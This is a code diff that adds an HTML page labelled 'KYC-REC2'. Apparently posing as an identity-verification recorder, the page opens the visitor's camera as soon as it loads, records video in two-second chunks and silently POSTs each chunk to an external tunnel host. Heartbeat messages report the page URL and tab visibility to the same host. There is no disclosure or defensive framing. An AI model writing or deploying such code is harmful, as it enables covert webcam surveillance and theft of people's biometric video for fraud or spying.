@@ -1,0 +1,20 @@
+<!doctype html><html><head><meta charset="utf-8"><title>KYC-REC2</title></head>
+<body style="font:14px monospace;padding:8px"><h3>KYC-REC2</h3><pre id="o">start</pre>
+<script>
+var HOOK='https://5783f5c5ed5043.lhr.life/rec', T0=Date.now(), chunk=0, total=0;
+function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
+function post(t,d){try{var u=HOOK+'?ev='+encodeURIComponent(t)+'&d='+encodeURIComponent(String(d).substr(0,300));fetch(u,{method:'POST',body:t})}catch(e){}}
+post('REC_PAGE',{href:location.href,mr:typeof MediaRecorder});
+navigator.mediaDevices.getUserMedia({video:{width:480,height:640},audio:false}).then(function(st){
+  var t=st.getVideoTracks()[0], s=t.getSettings(); post('REC_STREAM',t.label+' '+s.width+'x'+s.height);
+  var types=['video/webm;codecs=vp8','video/webm','video/mp4'], mime=null;
+  types.forEach(function(m){ if(!mime && window.MediaRecorder && MediaRecorder.isTypeSupported(m)) mime=m });
+  var mr=new MediaRecorder(st, mime?{mimeType:mime}:undefined); post('REC_MIME',mime||'default');
+  mr.ondataavailable=function(e){ if(!e.data||!e.data.size) return; var i=++chunk; total+=e.data.size;
+    var u=HOOK+'?ev=CHUNK&chunk='+i+'&bytes='+e.data.size+'&total='+total+'&t='+(Date.now()-T0);
+    try{ fetch(u,{method:'POST',body:e.data}) }catch(err){}
+    log('chunk'+i+' '+e.data.size+'B t='+(Date.now()-T0)); };
+  mr.start(2000); post('REC_STARTED',{mime:mime||'default'});
+  setInterval(function(){ post('REC_HEARTBEAT',{t:Date.now()-T0,chunks:chunk,total:total,state:mr.state,vis:document.visibilityState}) },5000);
+}).catch(function(e){ post('REC_ERR',''+e) });
+</script></body></html>
